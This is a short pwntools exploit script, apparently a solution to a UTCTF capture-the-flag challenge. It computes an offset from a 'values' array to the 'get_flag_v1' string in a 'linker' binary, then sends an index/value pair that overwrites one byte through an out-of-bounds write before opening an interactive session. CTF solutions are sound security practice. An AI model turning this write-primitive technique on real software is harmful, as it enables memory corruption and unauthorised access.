#!/usr/bin/python3

from pwn import *

exe = ELF('linker')
lib = ELF('libflag.so')

context.log_level = 'debug'
context.binary = exe

if args.REMOTE:
    p = remote('pwn.utctf.live', 5433)
else:
    p = process(exe.path, env={'LD_PRELOAD': lib.path})

get_f_addr = next(exe.search(b'get_flag_v1'))
vals_addr = 0x3458

index = get_f_addr + 10 - vals_addr
value = 0x32

log.info(f'get_flag_v1 @ {hex(get_f_addr)}')
log.info(f'index = {index}')

p.sendlineafter(b'values\n', f'{index} {value}'.encode())

p.interactive()
